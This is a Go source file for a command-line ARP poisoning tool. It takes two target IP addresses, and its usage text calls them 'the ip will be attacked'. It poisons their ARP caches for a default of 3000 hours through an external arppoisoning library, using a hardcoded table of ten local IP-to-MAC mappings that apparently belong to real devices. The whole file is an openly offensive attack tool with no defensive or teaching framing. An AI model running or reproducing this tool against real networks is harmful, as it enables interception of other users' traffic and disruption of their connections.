package main

import (
	"github.com/blackmady/arppoison/arppoisoning"
	"net"
	"time"
	"github.com/gotips/log"
	"os"
	"fmt"
	"flag"
)
func usage(){
	s:=`
	arppoison -ip1 192.168.56.103 -ip2 192.168.56.104 -t seconds -d
	-ip1,-ip2: the ip will be attacked
	-t how many seconds to attack，default is 3000 *3600 seconds, 3000 hour
	-d print debug message
	`
	fmt.Println(s)
	os.Exit(0)
}
var (
	ip1str string
	ip2str string
	timeout int
	debug bool
)


func init() {
	flag.StringVar(&ip1str, "ip1", "", "ip1")
	flag.StringVar(&ip2str, "ip2", "", "ip2")
	flag.BoolVar(&debug, "d", false, "print debug message")
	flag.IntVar(&timeout, "t", 3000*3600, " how many seconds to attack")
}

func main() {

//
	macs:=map[string]string{
		"192.168.1.111":"90-2B-34-1F-82-BF",
		"192.168.1.18":"74-23-44-D8-ED-80",
		"192.168.1.12":"C4-B3-01-CE-FD-C9",
		"192.168.1.5":"88-53-95-B2-C9-DE",
		"192.168.1.8":"D4-97-0B-7F-9D-18",
		"192.168.1.3":"B4-43-0D-C4-CD-87",
		"192.168.1.6":"38-A4-ED-17-4A-61",
		"192.168.0.101":"00-E0-B6-11-80-56",
		"192.168.0.102":"18-DC-56-F0-2C-EB",
		"192.168.0.107":"A0-93-47-46-2D-C1",
	}

	flag.Parse()
	if len(ip1str)<=0 || len(ip2str)<=0 {
		usage()
	}
	stop:=make(chan bool)
	if debug{
//		log.SetLevel(log.TraceLevel)
	} else{
//		log.SetLevel(log.InfoLevel)
	}
	ip1:=net.ParseIP(ip1str)
	ip2:=net.ParseIP(ip2str)
	log.Infof("start arp poisoning :%s,%s,%d",ip1,ip2,timeout)
	go  func(){
//		err:=arppoisoning.ArpPoisoningWithIP(ip1,ip2,stop)
		err:=arppoisoning.ArpPoisoningWithIP2(ip1,ip2,stop,macs)
		if err!=nil{
			log.Error(err)
		}
	}()
	time.Sleep(time.Duration(int64(timeout)*int64(time.Second)))
	close(stop)
}
